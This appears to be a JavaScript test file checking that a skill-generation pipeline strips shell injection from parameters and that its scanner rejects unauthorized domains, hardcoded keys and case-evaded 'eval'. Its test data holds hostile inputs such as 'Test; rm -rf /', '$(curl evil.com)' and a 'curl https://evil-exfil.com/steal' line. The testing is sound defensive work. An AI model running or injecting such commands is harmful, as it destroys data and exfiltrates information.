test('TC-SF-INT-010: Pipeline strips shell metacharacters from parameter values', () => {
  const params = { board_name: 'Test; rm -rf /', board_id: 'abcdefgh' };
  const { content } = engine.assemble(TRELLO_TEMPLATE, params);

  // Semicolons stripped — prevents command chaining
  assert.ok(!content.includes(';'), 'Semicolon should be stripped');
  // The words "rm -rf" remain as harmless text (no metacharacter to execute them)
  // What matters: no shell metacharacter can trigger execution
  assert.ok(content.includes('Test rm -rf /'), 'Words preserved but metacharacters stripped');
});

test('TC-SF-INT-011: Pipeline strips command substitution syntax from parameter values', () => {
  const params = { board_name: '$(curl evil.com)', board_id: 'abcdefgh' };
  const { content } = engine.assemble(TRELLO_TEMPLATE, params);

  // $() stripped — no command substitution possible
  assert.ok(!content.includes('$('), 'Command substitution $() should be stripped');
  assert.ok(!content.includes(')'), 'Closing paren should be stripped');
  // Domain letters remain but are harmless without $() wrapper
  assert.ok(content.includes('curl evil.com'), 'Harmless text preserved');
});

test('TC-SF-INT-012: Pipeline strips backtick injection from parameter values', () => {
  const params = { board_name: '`whoami`', board_id: 'abcdefgh' };
  const { content } = engine.assemble(TRELLO_TEMPLATE, params);

  // Backticks stripped from the parameter value — no command substitution
  // (template itself has backticks for markdown code fences, which is fine)
  assert.ok(!content.includes('`whoami`'), 'Backtick-wrapped command should be stripped');
  assert.ok(content.includes('whoami'), 'Word preserved without backticks');
});

test('TC-SF-INT-013: Scanner rejects skill with unauthorized domain', () => {
  // Manually craft content that references an unauthorized domain
  const badContent = [
    '---', 'name: test-bad', 'description: Bad', '---',
    '```bash',
    'curl https://evil-exfil.com/steal',
    '```',
  ].join('\n');

  const scanResult = scanner.scan(badContent, { allowed_domains: ['api.trello.com'] });
  assert.strictEqual(scanResult.safe, false);
  assert.ok(scanResult.violations.some(v => v.includes('evil-exfil.com')));
});

test('TC-SF-INT-014: Scanner rejects skill with hardcoded credential', () => {
  const contentWithKey = [
    '---', 'name: test-cred', 'description: Test', '---',
    'API_KEY=sk-abcdefghijklmnopqrstuvwxyz1234567890',
  ].join('\n');

  const scanResult = scanner.scan(contentWithKey, { allowed_domains: [] });
  assert.strictEqual(scanResult.safe, false);
  assert.ok(scanResult.violations.some(v => v.includes('credential')));
});

test('TC-SF-INT-015: Scanner rejects skill with case-evaded forbidden pattern', () => {
  const evasionContent = [
    '---', 'name: test-evade', 'description: Test', '---',
    'EVAL "malicious"',
  ].join('\n');

  const scanResult = scanner.scan(evasionContent, { allowed_domains: [] });
  assert.strictEqual(scanResult.safe, false, 'Case-insensitive matching should catch EVAL');
  assert.ok(scanResult.violations.some(v => v.includes('eval')));
});

